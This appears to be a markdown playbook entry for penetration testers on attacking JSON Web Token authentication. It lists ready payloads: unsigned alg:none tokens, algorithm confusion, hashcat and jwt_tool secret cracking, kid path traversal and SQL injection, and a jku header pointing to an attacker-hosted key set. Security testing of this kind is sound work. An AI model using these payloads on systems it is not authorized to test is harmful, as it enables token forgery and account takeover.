---
id: jwt
name: JWT Attacks
phase: exploit
severity: high
aliases: [jwt, json-web-token, token-forgery, jwt-attacks]
tags: [auth, tokens, crypto]
---

# JWT Attacks

## When to use
The target issues JSON Web Tokens for sessions, API auth, or SSO handoff (Authorization: Bearer or cookie).
Recon signal: base64url segments beginning with eyJ in headers, cookies, or local storage, or a /.well-known/jwks.json endpoint.
Authorization decisions keyed on claims such as role, sub, is_admin, or tenant make forgery high impact.

## Quick checks
1. Decode the token and record header fields: alg, kid, jku, x5u, typ, cty.
2. Change a payload claim (role/sub) without re-signing; replay and watch the status code.
3. Set alg to none and strip the signature; test variants none, None, NONE, nOnE.
4. Try RS256 to HS256 confusion using the server's public key as the HMAC secret.
5. Crack weak HMAC secrets offline with hashcat -m 16500 or jwt_tool.
6. Probe kid for path traversal or SQL injection, and jku/x5u for SSRF to an attacker JWKS.

## Payloads / test cases
- Unsigned: header {"alg":"none","typ":"JWT"} with an empty signature segment.
- Algorithm confusion: sign HS256 using the RSA public key PEM as the secret.
- Weak secret: jwt_tool.py <token> -C -d rockyou.txt or hashcat -m 16500.
- kid traversal: {"alg":"HS256","kid":"../../../../dev/null"} signed with an empty key.
- kid SQLi: {"kid":"x' UNION SELECT 'known-secret'-- -"} then sign with known-secret.
- jku injection: {"jku":"https://attacker.tld/jwks.json","kid":"attacker-key"} with a matching JWKS.

## Detection & confirmation
1. Capture a baseline authenticated request and response (200, normal privileges).
2. Replay the tampered token; a 200 with elevated or foreign data proves acceptance.
3. For alg:none, verify the server does not fall back to a configured default key.
4. For cracked secrets, re-sign a token for an admin user and show the elevated response.
5. Record the exact claim diff (sub, role, tenant) that changes the authorization outcome.

## Escalation
Forged admin or cross-tenant token on production -> P1; expired-token or claim bypass without privilege gain -> P2; alg:none rejected but verbose errors leak keys -> P3 (see prioritization.md).

## Evidence to capture
- Raw baseline request and response with the original token.
- Decoded header and payload before and after tampering.
- Raw request and response for the forged token.
- Recovered secret, public key, or attacker JWKS URL used.
- Screenshot of elevated access or foreign data rendered.

## Common false positives
- Client-side UI renders admin navigation from an unverified token while the API still enforces authz.
- alg:none accepted only for tokens that are already expired or revoked.
- kid value reflected in an error message but never used for key lookup.
- Rotating signing keys where an old key legitimately remains valid for a grace period.

## Related skills
- [[oauth]]
- [[csrf]]
- [[business-logic]]
